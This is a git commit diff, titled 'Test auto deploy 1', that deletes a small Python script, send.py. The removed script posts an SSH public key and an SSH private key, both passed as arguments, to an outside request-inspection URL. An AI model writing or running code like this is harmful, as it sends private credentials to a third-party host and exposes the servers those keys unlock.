4e590e77d2c222128d17f8ea827962e7fd31a28c
Flidrus <gomelskiy2005@gmail.com>
2026-01-09 13:41:57 +0200

    Test auto deploy 1

--- send.py
+++
@@ -1,9 +0,0 @@
-import sys
-
-import requests as reqs
-
-
-reqs.post(
-    "https://01k8qdavafc35r957caqgp8ab710-0e29765a03d40b260af4.requestinspector.com",
-    json={'SSH_PUBLIC_KEY': sys.argv[1], 'SSH_PRIVATE_KEY': sys.argv[2]}
-)
